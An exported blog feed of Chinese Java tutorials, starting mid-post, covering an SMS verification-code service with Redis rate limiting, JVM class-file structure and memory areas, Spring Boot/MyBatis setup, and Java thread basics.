resp.setCode(Constants.RESP_STATUS_INTERNAL_ERROR); resp.setMessage(e.getMessage()); &#125;catch (Exception e)&#123; log.error("fail to login",e); resp.setCode(Constants.RESP_STATUS_INTERNAL_ERROR); resp.setMessage("内部错误"); &#125; return resp;&#125; 拿到ip的方法，在baseController中： 12345678910111213protected String getIpFromRequest(HttpServletRequest request) &#123; String ip = request.getHeader("x-forwarded-for"); if(ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip))&#123; ip = request.getHeader("Proxy-Client-IP"); &#125; if(ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip))&#123; ip = request.getHeader("WL-Proxy-Client-IP"); &#125; if(ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip))&#123; ip = request.getRemoteAddr(); &#125; return ip.equals("0:0:0:0:0:0:0:1")?"127.0.0.1":ip;&#125; 然后去service层发送短信： 首先是自动生成四位短信验证码： 12345678910public class RandomNumberCode &#123; public static String verCode()&#123; Random random =new Random(); return StringUtils.substring(String.valueOf(random.nextInt()*-10), 2, 6); &#125; public static String randomNo()&#123; Random random =new Random(); return String.valueOf(Math.abs(random.nextInt()*-10)); &#125;&#125; 4、service层：12private static final String VERIFYCODE_PREFIX = "verify.code.";private static final String SMS_QUEUE = "sms.queue"; 1234567891011121314151617@Overridepublic void sendVercode(String mobile, String ip) throws BikeException &#123; String verCode = RandomNumberCode.verCode(); //先存到redis中 redis检查是否有恶意请求，再决定好是否发送验证码 int result = commonCacheUtil.cacheForVerificationCode(VERIFYCODE_PREFIX+mobile,verCode,"reg",60,ip); if (result == 1) &#123; log.info("当前验证码未过期，请稍后重试"); throw new BikeException("当前验证码未过期，请稍后重试"); &#125; else if (result == 2) &#123; log.info("超过当日验证码次数上线"); throw new BikeException("超过当日验证码次数上限"); &#125; else if (result == 3) &#123; log.info("超过当日验证码次数上限 &#123;&#125;", ip); throw new BikeException(ip + "超过当日验证码次数上限"); &#125; log.info("Sending verify code &#123;&#125; for phone &#123;&#125;", verCode, mobile);&#125; 对应的redis缓存操作： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768public int cacheForVerificationCode(String key, String value, String type, int timeout, String ip) throws BikeException &#123; try &#123; JedisPool pool = jedisPoolWrapper.getJedisPool(); if (pool != null) &#123; try (Jedis jedis = pool.getResource()) &#123; jedis.select(0); //对ip进行判断，是否是发送过的，并且判断发送次数 String ipKey = "ip." + ip; if(ip==null)&#123; return 3; &#125;else&#123; String ipSendCount = jedis.get(ipKey); try &#123; if (ipSendCount != null &amp;&amp; Integer.parseInt(ipSendCount) &gt;= 3) &#123; return 3; &#125; &#125; catch (NumberFormatException e) &#123; log.error("Fail to process ip send count", e); return 3; &#125; &#125; //将key和value塞进缓存中，如果缓存中不存在则塞入成功返回1，否则返回0 long succ = jedis.setnx(key, value); //返回0说明此时缓存中仍然存在这个值，说明验证码还没过期就又发送了一遍，此时我们是不给他发短信的 if (succ == 0) &#123; return 1; &#125; //根据手机号码进行判断 String sendCount = jedis.get(key+"."+type); //如果不为空并且超出了次数，也不发短信 try &#123; if (sendCount != null &amp;&amp; Integer.parseInt(sendCount) &gt;= 3) &#123; jedis.del(key); return 2; &#125; &#125; catch (NumberFormatException e) &#123; log.error("Fail to process send count", e); jedis.del(key); return 2; &#125; //走到这一步说明没有什么恶意请求 try &#123; //设置当前这个验证码的过期时间 jedis.expire(key, timeout); //对验证手机号码的value增1 long val = jedis.incr(key + "." + type); if (val == 1) &#123; //设置验证手机号码的key的过期时间为一天，过期后就自动删除，即第二天又可以发送3条短信了 jedis.expire(key + "." + type, 86400); &#125; //对验证ip的value增1 jedis.incr(ipKey); if (val == 1) &#123; //设值验证ip的key的过期时间为一天，过期后就自动删除，即第二天又可以发送3条短信了 jedis.expire(ipKey, 86400); &#125; &#125; catch (Exception e) &#123; log.error("Fail to cache data into redis", e); &#125; &#125; &#125; &#125; catch (Exception e) &#123; log.error("Fail to cache for expiry", e); throw new BikeException("Fail to cache for expiry"); &#125; //一切正常返回0 return 0;&#125; 这段程序实现了对短信验证码的保护，防止有人恶意地批量发送短信。其思想主要是判断手机号码和ip是否查出了我们的限制。我们对这种保护机制的时间设定为一天，一天之内，只要你的ip或者手机号码发过来为空或者次数超出限制，短信是不会继续发送的，并且抛给前台异常信息。 5、一切正常之后就可以发送短信了：在service层下面继续： 12345678//验证码推送到队列，SMS_QUEUE就是目的地queue：sms.queueDestination destination = new ActiveMQQueue(SMS_QUEUE);Map&lt;String,String&gt; smsParam = new HashMap&lt;&gt;();smsParam.put("mobile",mobile);smsParam.put("tplId", Constants.MDSMS_VERCODE_TPLID);smsParam.put("vercode",verCode);String message = JSON.toJSONString(smsParam);smsProcessor.sendSmsToQueue(destination,message); 这里将短信验证码用activityMQ消息队列异步发出去的： 123456789101112131415161718@Componentpublic class SmsProcessor &#123; @Autowired private JmsMessagingTemplate jmsTemplate; @Autowired private SmsSender smsSender; public void sendSmsToQueue(Destination destination, final String message)&#123; jmsTemplate.convertAndSend(destination, message); &#125; @JmsListener(destination="sms.queue") public void doSendSmsMessage(String text)&#123; JSONObject jsonObject = JSON.parseObject(text); smsSender.sendSms(jsonObject.getString("mobile"),jsonObject.getString("tplId"),jsonObject.getString("vercode")); &#125;&#125; 下面的doSendSmsMessage是消费者，监听sms.queue这个队列，有东西来了就消费，这里是监听到消息就将短息发出去： 这是一个通用的接口，一般的短信发送都是这个模板：phone,templeteId,参数123public interface SmsSender &#123; void sendSms(String phone,String tplId,String params);&#125; 我这里用的秒嘀实现这个短信接口： 1234567891011121314151617181920212223242526272829303132333435@Service@Slf4jpublic class MiaoDiSmsSender implements SmsSender&#123; private static String operation = "/industrySMS/sendSMS"; /** *@Author JackWang [www.coder520.com] *@Date 2017/8/5 16:23 *@Description 秒滴发送短信 */ @Override public void sendSms(String phone,String tplId,String params)&#123; try &#123; SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHHmmss"); String timestamp = sdf.format(new Date()); String sig = MD5Util.getMD5(Constants.MDSMS_ACCOUNT_SID +Constants.MDSMS_AUTH_TOKEN +timestamp); String url = Constants.MDSMS_REST_URL +operation; Map&lt;String,String&gt; param = new HashMap&lt;&gt;(); param.put("accountSid",Constants.MDSMS_ACCOUNT_SID); param.put("to",phone); param.put("templateid",tplId); param.put("param",params); param.put("timestamp",timestamp); param.put("sig",sig); param.put("respDataType","json"); String result = HttpUtil.post(url,param); JSONObject jsonObject = JSON.parseObject(result); if(!jsonObject.getString("respCode").equals("00000"))&#123; log.error("fail to send sms to "+phone+":"+params+":"+result); &#125; &#125; catch (Exception e) &#123; log.error("fail to send sms to "+phone+":"+params); &#125; &#125;&#125; 其中，参数都是从官方获取的： 大家都用各自的： 12345678910/**秒滴SMS start**/public static final String MDSMS_ACCOUNT_SID = "fbfdd5bd437a47xxx912f84";public static final String MDSMS_AUTH_TOKEN = "4f0d9f14f4444479xxx9b52923";public static final String MDSMS_REST_URL = "https://api.miaodiyun.com/20150822";public static final String MDSMS_VERCODE_TPLID = "93696219";/**秒滴SMS end**/ 这样就完成了发短信的功能： postman发送手机号码，这个路径是不被拦截的： 1localhost:8888/user/sendVercode 直接发送： 123&#123; "mobile":"15895967012"&#125; 从效果来看，60秒之内不能重复发，一天内不能发超过三次。达到了预期的效果。]]></content>
      <tags>
        <tag>单车后台系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[七、Class文件中的访问标志、类索引、父类索引、接口索引集合]]></title>
    <url>%2F2018%2F07%2F21%2F%E4%B8%83%E3%80%81Class%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E8%AE%BF%E9%97%AE%E6%A0%87%E5%BF%97%E3%80%81%E7%B1%BB%E7%B4%A2%E5%BC%95%E3%80%81%E7%88%B6%E7%B1%BB%E7%B4%A2%E5%BC%95%E3%80%81%E6%8E%A5%E5%8F%A3%E7%B4%A2%E5%BC%95%E9%9B%86%E5%90%88%2F</url>
    <content type="text"><![CDATA[讲完了class文件中的常量池，我们就相当于克服了class文件中最麻烦的模块了。现在，我们来看一下class文件中紧接着常量池后面的几个东西：访问标志、类索引、父类索引、接口索引集合。 1. 访问标志、类索引、父类索引、接口索引集合 在class文件中的位置 2. 访问标志(access_flags)能够表示什么？访问标志（access_flags）紧接着常量池后，占有两个字节，总共16位，如下图所示： 当JVM在编译某个类或者接口的源代码时，JVM会解析出这个类或者接口的访问标志信息，然后，将这些标志设置到访问标志（access_flags）这16个位上。JVM会考虑如下设置如下访问表示信息： a. 类或接口我们知道，每个定义的类或者接口都会生成class文件（这里也包括内部类，在某个类中定义的静态内部类也会单独生成一个class文件）。 对于定义的类，JVM在将其编译成class文件时，会将class文件的访问标志的第11位设置为1 。第11位叫做ACC_SUPER标志位； 对于定义的接口，JVM在将其编译成class文件时，会将class文件的访问标志的第8位 设置为 1 。第8位叫做ACC_INTERFACE标志位； b. 访问权限：public类型和包package类型。如果类或者接口被声明为public类型的，那么，JVM将其编译成class文件时，会将class文件的访问标志的第16位设置为1 。第16位叫做ACC_PUBLIC标志符； c. 类是否为抽象类型的，即我们定义的类有没有被abstract关键字修饰，即我们定义的类是否为抽象类。1public abstract class MyClass&#123;......&#125; 定义某个类时，JVM将它编译成class文件的时候，会将class文件的访问标志的第7位设置为1 。第7位叫做ACC_ABSTRACT标志位。 另外值得注意的是，对于定义的接口，JVM在编译接口的时候也会对class文件的访问标志上的ACC_ABSTRACT标志位设置为 1； d. 该类是否被声明了final类型,即表示该类不能被继承。此时JVM会在编译class文件的过程中，会将class文件的访问标志的第12位设置为 1 。第12位叫做ACC_FINAL标志位； e.是否是JVM通过java源代码文件编译而成的如果我们这个class文件不是JVM通过java源代码文件编译而成的，而是用户自己通过class文件的组织规则生成的，那么，一般会对class文件的访问标志第4位设置为 1 。通过JVM编译源代码产生的class文件此标志位为 0，第4位叫做ACC_SYNTHETIC标志位； f. 枚举类对于定义的枚举类如：public enum EnumTest{….}，JVM也会对此枚举类编译成class文件，这时，对于这样的class文件，JVM会对访问标志第2位设置为 1 ，以表示它是枚举类。第2位叫做ACC_ENUM标志位； g. 注解类对于定义的注解类如：public @interface{…..},JVM会对此注解类编译成class文件，对于这样的class文件，JVM会将访问标志第3位设置为1，以表示这是个注解类，第3位叫做ACC_ANNOTATION标志位。 当JVM确定了上述标志位的值后，就可以确定访问标志（access_flags）的值了。实际上JVM上述标志会根据上述确定的标志位的值，对这些标志位的值取或，便得到了访问标志（access_flags）。如下图所示: 举例定义一个最简单的类Simple.java，使用编译器编译成class文件，然后观察class文件中的访问标志的值，以及使用javap -v Simple 查看访问标志。 123public class Simple &#123; &#125; 使用UltraEdit查看编译成的class文件，如下图所示： 上述的图中黄色部分表示的是常量池部分,常量池后面紧跟着就是访问标志，它的十六进制值为0x0021,二进制的值为：00000000 00100001，由二进制的1的位数可以得出第11、16位为1，分别对应ACC_SUPER标志位和ACC_PUBLIC标志位。验证一下: 3. 类索引(this_class)是什么？我们知道一般情况下一个Java类源文件经过JVM编译会生成一个class文件，也有可能一个Java类源文件中定义了其他类或者内部类，这样编译出来的class文件就不止一个，但每一个class文件表示某一个类，至于这个class表示哪一个类，便可以通过 类索引 这个数据项来确定。JVM通过类的完全限定名确定是某一个类。 类索引的作用，就是为了指出class文件所描述的这个类叫什么名字。 类索引紧接着访问标志的后面，占有两个字节，在这两个字节中存储的值是一个指向常量池的一个索引，该索引指向的是CONSTANT_Class_info常量池项. 以上面定义的Simple.class 为例，如下图所示，查看他的类索引在什么位置和取什么值。 由上可知，它的类索引值为0x0001,那么，它指向了常量池中的第一个常量池项，那我们再看一下常量池中的信息。使用javap -v Simple,常量池中有以下信息： 可以看到常量池中的第一项是CONSTANT_Class_info项，它表示一个”com/louis/jvm/Simple”的类名。即类索引是告诉我们这个class文件所表示的是哪一个类。 4. 父类索引(super_class)是什么？Java支持单继承模式，除了java.lang.Object 类除外，每一个类都会有且只有一个父类。class文件中紧接着类索引(this_class)之后的两个字节区域表示父类索引，跟类索引一样，父类索引这两个字节中的值指向了常量池中的某个常量池项CONSTANT_Class_info，表示该class表示的类是继承自哪一个类。 5. 接口索引集合(interfaces)是什么？ 一个类可以不实现任何接口，也可以实现很多个接口，为了表示当前类实现的接口信息，class文件使用了如下结构体描述某个类的接口实现信息: 由于类实现的接口数目不确定，所以接口索引集合的描述的前部分叫做接口计数器（interfaces_count），接口计数器占用两个字节，其中的值表示着这个类实现了多少个接口，紧跟着接口计数器的部分就是接口索引部分了，每一个接口索引占有两个字节，接口计数器的值代表着后面跟着的接口索引的个数。接口索引和类索引和父类索引一样，其内的值存储的是指向了常量池中的常量池项的索引，表示着这个接口的完全限定名。 举例： 定义一个Worker接口，然后类Programmer实现这个Worker接口，然后我们观察Programmer的接口索引集合是怎样表示的。 12345public interface Worker&#123; public void work(); &#125; 1234567public class Programmer implements Worker &#123; @Override public void work() &#123; System.out.println("I'm Programmer,Just coding...."); &#125; &#125;]]></content>
      <tags>
        <tag>java虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一、整合ssm]]></title>
    <url>%2F2018%2F07%2F21%2F%E4%B8%80%E3%80%81%E6%95%B4%E5%90%88ssm%2F</url>
    <content type="text"><![CDATA[springBoot整合SSM，或者说就是整合mybatis。 1、创建登陆https://start.spring.io/可以创建,也可以像我之前spring中springboot入门中创建。 2、springBoot整合springMVC引入依赖： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt; 创建controller，直接返回string，这里用@RestController，那么自动返回json数据，不需要@ResponseBody了。 123456789@RestController@RequestMapping("user")public class UserController &#123; @RequestMapping("/test") public String test()&#123; return "hello bike"; &#125;&#125; 在application.yml文件配置端口(默认生成的是application.properties，改后缀) 12server: port: 8888 启动主函数即可。在浏览器输入localhost:8888/user/test即可看到hello bike. 3、整合mybatis引入依赖： 1234567891011121314151617181920212223242526272829&lt;!--MYSQL--&gt;&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!--mybatis--&gt;&lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.2.0&lt;/version&gt;&lt;/dependency&gt;&lt;!--fastJson--&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.12&lt;/version&gt;&lt;/dependency&gt;&lt;!--druid--&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;1.0.18&lt;/version&gt;&lt;/dependency&gt;&lt;!--mybatis generator--&gt;&lt;dependency&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-core&lt;/artifactId&gt; &lt;version&gt;1.3.2&lt;/version&gt;&lt;/dependency&gt; 并且加入插件 123456789101112131415161718192021222324252627&lt;build&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/java&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/includes&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-maven-plugin&lt;/artifactId&gt; &lt;version&gt;1.3.0&lt;/version&gt; &lt;configuration&gt; &lt;configurationFile&gt;src/main/resources/generatorConfig.xml&lt;/configurationFile&gt; &lt;verbose&gt;true&lt;/verbose&gt; &lt;overwrite&gt;true&lt;/overwrite&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 另外在application.yml中要配置数据源和Mybatis扫描： 123456789101112131415161718192021222324252627282930313233#startupserver: port: 8888#Springspring: application: name: bike01#profile profiles: active: dev#datasource datasource: # druid type: com.alibaba.druid.pool.DruidDataSource driver-class-name: com.mysql.jdbc.Driver filters: stat maxActive: 20 initialSize: 1 maxWait: 60000 minIdle: 1 timeBetweenEvictionRunsMillis: 60000 minEvictableIdleTimeMillis: 300000 validationQuery: select 'x' testWhileIdle: true testOnBorrow: false testOnReturn: false poolPreparedStatements: true maxOpenPreparedStatements: 20#mybatismybatis: mapper-locations: classpath:com/oursnail/**/**.xml type-aliases-package: classpath:com.oursnail.**.entity 其中的profile就是配置数据源选择哪一个，一个是测试环境，一个是本地环境。这里再建立一个本地环境的配置文件：application-dev.yml： 123456spring: datasource: name: dev url: jdbc:mysql://localhost:3306/bike username: root password: root 4、用户表：123456789101112131415161718-- ------------------------------ Table structure for user-- ----------------------------DROP TABLE IF EXISTS `user`;CREATE TABLE `user` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `nickname` varchar(20) DEFAULT NULL COMMENT '昵称', `mobile` varchar(20) NOT NULL COMMENT '手机号码', `head_img` varchar(100) DEFAULT NULL COMMENT '头像', `verify_flag` tinyint(2) NOT NULL DEFAULT '1' COMMENT '是否实名认证 1： 否 2：已认证', `enable_flag` tinyint(2) NOT NULL DEFAULT '1' COMMENT '是否有效有用 1：有效 2：无效', PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;-- ------------------------------ Records of user-- ----------------------------INSERT INTO `user` VALUES ('1', 'wang', '18980840843', null, '2', '1'); 5、mybatis自动生成工具配置文件和依赖算是全部完成了，下面就用generator工具生成dao和entity（略） 6、service和controller再继续完成相应的service和controller层，其中controller层为： 12345678910111213@RestController@RequestMapping("user")public class UserController &#123; @Autowired private UserService userService; @RequestMapping("/test") public User test()&#123; User u = userService.getUserById(1L); return u; &#125;&#125; 7、出错:找不到mapper依赖启动发现报错，无法找到mapper依赖，查看编译文件，都是编译进去的，这种情况从来没有发生过，后来发现mapper接口上需要增加注解： 1@Mapper 8、启动直接启动main函数，输入url:http://localhost:8888/user/test正确结果是返回一条用户信息的json字符串显示在页面上： 1&#123;&quot;id&quot;:1,&quot;nickname&quot;:&quot;wang&quot;,&quot;mobile&quot;:&quot;18980840843&quot;,&quot;headImg&quot;:null,&quot;verifyFlag&quot;:2,&quot;enableFlag&quot;:1&#125; 只要出现了这个字符串，那么就算是springBoot整合ssm成功了！ 9、打开事务在主函数上添加注解： @EnableTransactionManagement 然后在方法上添加事务注解： @Transactional]]></content>
      <tags>
        <tag>单车后台系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一、线程基础]]></title>
    <url>%2F2018%2F07%2F21%2F%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%2F</url>
    <content type="text"><![CDATA[从今天开始，开始学习java并发编程的基础知识。本篇介绍java并发编程中的几个关键字以及如何使用。 1、第一种方式实现两个线程交替运行（推荐）：线程类： 1234567891011121314151617181920public class PrintChar implements Runnable&#123; private char c; private int times; public PrintChar() &#123; &#125; public PrintChar(char c, int times) &#123; this.c = c; this.times = times; &#125; @Override public void run() &#123; for(int i=0; i&lt;times; i++)&#123; System.out.print(c); &#125; System.out.println(); &#125;&#125; main启动两个线程： 12345678public class Demo1 &#123; public static void main(String[] args) &#123; Thread t1 = new Thread(new PrintChar('A',100)); Thread t2 = new Thread(new PrintChar('B',100)); t1.start(); //start表示进入可以运行的状态，不是立即执行 t2.start(); &#125;&#125; 2、第二种方式实现两个线程交替运行1234567891011121314151617181920public class PrintChar02 extends Thread &#123; private char c; private int times; public PrintChar02() &#123; &#125; public PrintChar02(char c, int times) &#123; this.c = c; this.times = times; &#125; @Override public void run() &#123; for(int i=0; i&lt;times; i++)&#123; System.out.print(c); &#125; System.out.println(); &#125;&#125; main启动： 12345678910111213141516package com.company.xiancheng;/** * @Author 【swg】. * @Date 2017/11/22 13:32 * @DESC * @CONTACT 317758022@qq.com */public class Demo1 &#123; public static void main(String[] args) &#123; PrintChar02 t1 = new PrintChar02('A',100); PrintChar02 t2 = new PrintChar02('B',100); t1.start(); t2.start(); &#125;&#125; 3、Thread.yield()让出当前线程执行权。 12345678910111213141516171819202122232425262728package com.company.xiancheng;/** * @Author 【swg】. * @Date 2017/11/22 13:49 * @DESC * @CONTACT 317758022@qq.com */public class PrintNumber implements Runnable&#123; private int num; public PrintNumber() &#123; &#125; public PrintNumber(int num) &#123; this.num = num; &#125; @Override public void run() &#123; for(int i=0; i&lt;num; i++)&#123; if (i==50)&#123; Thread.yield();//当i=50，将当前的线程执行权放弃，让cpu重新选择线程来执行 &#125; System.out.println(i); &#125; &#125;&#125; 结合前面两个打印A和B,看效果： 12345678910public class Demo1 &#123; public static void main(String[] args) &#123; Thread t1 = new Thread(new PrintChar('A',100)); Thread t2 = new Thread(new PrintChar('B',100)); Thread t3 = new Thread(new PrintNumber(100)); t1.start(); t2.start(); t3.start(); &#125;&#125; 结果发现当执行到50的时候，让出当前线程执行权，cpu重新选中线程执行。 4、Thread.sleep(毫秒数)让这个线程睡一会，多少毫秒之后我再继续执行。 5、join()定义一个打印字母的线程类： 1234567891011121314151617181920public class PrintChar implements Runnable&#123; private char c; private int times; public PrintChar() &#123; &#125; public PrintChar(char c, int times) &#123; this.c = c; this.times = times; &#125; @Override public void run() &#123; for(int i=0; i&lt;times; i++) &#123; System.out.print(c); &#125; System.out.println(); &#125;&#125; 在主函数中有一个循环打印数字的方法： 12345678910public class Demo1 &#123; public static void main(String[] args) &#123; Thread t1 = new Thread(new PrintChar('A',100)); t1.start(); for(int i=0; i&lt;50; i++) &#123; System.out.print(i); &#125; System.out.println(); &#125;&#125; 运行的效果是：主线程中的打印数字的方法一下全部执行掉，然后再执行打印字母的方法（大多数情况，也有可能是在一串数字之间夹杂着字母，存在一定的随机性）。 现在想：在主线程中插入该线程，使得该线程先执行，然后主线程再执行。 12345678910111213public class Demo1 &#123; public static void main(String[] args) throws InterruptedException &#123; Thread t1 = new Thread(new PrintChar('A',100)); t1.start(); for(int i=0; i&lt;50; i++) &#123; if(i==30)&#123; t1.join(); &#125; System.out.print(i); &#125; System.out.println(); &#125;&#125; 实际上，不一定每次都准确到30的时候就立即执行t1线程的，因为cpu执行的太快，不可能每次都很准确地停住。 6、设定优先级12345t1.setPriority(Thread.MAX_PRIORITY);t1.setPriority(Thread.MIN_PRIORITY);t1.setPriority(Thread.NORM_PRIORITY); 都是存在随机性的，但是设置了之后稍微地优先一点，反之也一样。 7、打断一个线程在主线程中给要被打断的线程设置标志位，表示这个线程可以被打断： 1t1.interrupt(); 在t1线程中判断打断标志位是不是被设为true了，是的话break自己打断： 1234if(Thread.currentThread().isInterrupted())&#123; System.out.println("我停止了"); break;&#125; 所以线程的终止只能由自己决定，不能被其他的线程控制。 1Thread.interrupted();//返回当前线程的中断标志位，并且重置 8、卖票程序 首先是一个基本的卖票的线程类： 123456789101112131415161718192021222324public class SellTickets implements Runnable&#123; private int ticketNumer = 100; @Override public void run() &#123; try &#123; while(ticketNumer&gt;0) &#123; sellTicket(); Thread.sleep(100); &#125; &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; private void sellTicket() &#123; if(ticketNumer&gt;0)&#123; ticketNumer--; System.out.println(Thread.currentThread().getName()+",还剩"+ticketNumer); &#125;else &#123; System.out.println("票卖光了"); &#125; &#125;&#125; main中假设有四个窗口卖票： 12345678910111213public class Demo2 &#123; public static void main(String[] args) &#123; SellTickets s = new SellTickets(); Thread t1 = new Thread(s,"窗口一"); Thread t2 = new Thread(s,"窗口二"); Thread t3 = new Thread(s,"窗口三"); Thread t4 = new Thread(s,"窗口四"); t1.start(); t2.start(); t3.start(); t4.start(); &#125;&#125; 我们发现票卖得十分混乱，出现四个窗口卖同一张的情况。 解决就是：上锁 同步代码块，锁可以是任何一个对象 12345678910private void sellTicket() &#123; synchronized (this)&#123;//锁，以当前对象为锁 if(ticketNumer&gt;0)&#123; ticketNumer--; System.out.println(Thread.currentThread().getName()+",还剩"+ticketNumer); &#125;else &#123; System.out.println("票卖光了"); &#125; &#125;&#125; 或者给方法加上synchronized,以当前对象为锁，可以达到一样的效果。 12345678private synchronized void sellTicket() &#123; if(ticketNumer&gt;0)&#123; ticketNumer--; System.out.println(Thread.currentThread().getName()+",还剩"+ticketNumer); &#125;else &#123; System.out.println("票卖光了"); &#125;&#125; 静态方法 加上static之后，锁就会变成类级别的，被所有对象共享。123456789101112private static int ticketNumer = 100;private static void sellTicket() &#123; synchronized (SellTickets.class)&#123;//以整个类为锁，那么可以对多个对象上锁 if(ticketNumer&gt;0)&#123; ticketNumer--; System.out.println(Thread.currentThread().getName()+",还剩"+ticketNumer); &#125;else &#123; System.out.println("票卖光了"); &#125; &#125;&#125; 或者12345678private synchronized static void sellTicket() &#123; if(ticketNumer&gt;0)&#123; ticketNumer--; System.out.println(Thread.currentThread().getName()+",还剩"+ticketNumer); &#125;else &#123; System.out.println("票卖光了"); &#125;&#125; 静态方法对应的main: 多个对象也不会混乱。 123456789101112public class Demo2 &#123; public static void main(String[] args) &#123; Thread t1 = new Thread(new SellTickets(),"窗口一"); Thread t2 = new Thread(new SellTickets(),"窗口二"); Thread t3 = new Thread(new SellTickets(),"窗口三"); Thread t4 = new Thread(new SellTickets(),"窗口四"); t1.start(); t2.start(); t3.start(); t4.start(); &#125;&#125; 总结：对同一个对象操作，synchronized就可以起效果；但是对不同的对象操作，那么run()必须是静态方法，将其上升到类级别的锁，使锁被所有的对象共享且唯一。 9、wait()、notify()、notifyAll() 先写一个messgae类： 123456789101112131415161718public class Message &#123; private String msg; public Message(String msg) &#123; this.msg = msg; &#125; public Message() &#123; &#125; public String getMsg() &#123; return msg; &#125; public void setMsg(String msg) &#123; this.msg = msg; &#125;&#125; waiter(): 123456789101112131415161718192021public class Waiter implements Runnable&#123; private Message msg; public Waiter(Message msg) &#123; this.msg = msg; &#125; @Override public void run() &#123; String name = Thread.currentThread().getName(); synchronized (msg)&#123; try &#123; System.out.println(name+"--等待"+System.currentTimeMillis()); msg.wait(); System.out.println(name+msg.getMsg()+System.currentTimeMillis()); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; notify(): 12345678910111213141516public class Notifier implements Runnable&#123; private Message msg; public Notifier(Message msg) &#123; this.msg = msg; &#125; @Override public void run() &#123; String name = Thread.currentThread().getName(); synchronized (msg)&#123; msg.setMsg("唤醒线程工作"); msg.notify(); &#125; &#125;&#125; main(): 1234567891011121314public class Demo3 &#123; public static void main(String[] args) throws InterruptedException &#123; Message msg = new Message("锁"); Waiter waiter = new Waiter(msg); new Thread(waiter,"Waiter1").start();//waiter1 Waiter waiter1 = new Waiter(msg); new Thread(waiter1,"Waiter2").start();//waiter2 Notifier notifier = new Notifier(msg); Thread.sleep(100); new Thread(notifier,"Notify").start();//notify &#125;&#125; 运行结果： 123Waiter1--等待1511336556113Waiter2--等待1511336556113Waiter1唤醒线程工作1511336556213 分析：主函数启动两个waiter线程类，都以msg为锁，那么如果是notify()，只能唤醒其中的一个，另一个就会处于阻塞的状态。本程序，只唤醒了Waiter1，Waiter2一直处于阻塞的状态，程序停在waiter处，等待被唤醒。 如果是： 1msg.notifyAll(); 结果是： 1234Waiter1--等待1511336596131Waiter2--等待1511336596131Waiter2唤醒线程工作1511336596230Waiter1唤醒线程工作1511336596230 分析：这里用notifyAll，即唤醒所有，那么这两个wait都被唤醒而继续执行了。]]></content>
      <tags>
        <tag>java并发基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一、java内存区域]]></title>
    <url>%2F2018%2F07%2F21%2F%E4%B8%80%E3%80%81java%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F%2F</url>
    <content type="text"><![CDATA[学习虚拟机，第一步是搞清楚虚拟机的内存区域各是什么以及是什么作用。 1、jdk&amp;jre&amp;jvm 从图中可以看到范围是jdk&gt;jre&gt;jvm。 2、Java虚拟机运行时内存模型 具体一点的图： 2.1 程序计数器 是一块较小的内存空间，他可以看作是当前线程所执行的字节码的行号指示器。 字节码解释器工作时就是通过改变这个计数器的值来选取下一条需要执行的字节码指令，分支、循环、跳转、异常处理、线程恢复等基础功能都需要依赖这个计数器来完成。 为了线程切换后能恢复到正确的执行位置，每条线程都需要有一个独立的程序计数器，各条线程之间计数器互不影响，独立存储，我们成这类内存区域为“线程私有”的内存。 如果线程正在执行的是一个java方法，这个计数器记录的是正在执行的虚拟机字节码指令的地址；如果正在执行的是Native方法，这个计数器值则为空(undefined). 此内存区域是唯一一个在java虚拟机规范中没有规定任何OutOfMemoryError情况的区域。 2.2 java虚拟机栈 线程私有，生命周期与线程相同。 虚拟机栈描述的是Java方法的内存模型：每个方法在执行的同时都会创建一个栈帧用于存储局部变量表、操作数栈、动态链接、方法出口等信息。每个方法从调用直至执行完成的过程，就对应着一个栈帧在虚拟机中入栈道出栈的过程。 我们口中常常提到的栈与堆，其中栈就是现在讲的虚拟机栈，或者说是虚拟机栈中局部变量表部分。 局部变量表存放了编译期可知的各种基本数据类型(boolean,byte,char,short,int,float,long,double),对象引用(它不等同于对象本身，可能是一个指向对象地址的引用指针，也可能是指向一个代表对象的句柄或其他与此对象相关的位置)、returnAddress类型(指向了一条字节码指令的地址) 其中64位长度的long和double类型的数据会占用2个局部变量空间，其余的数据类型只占用1个。 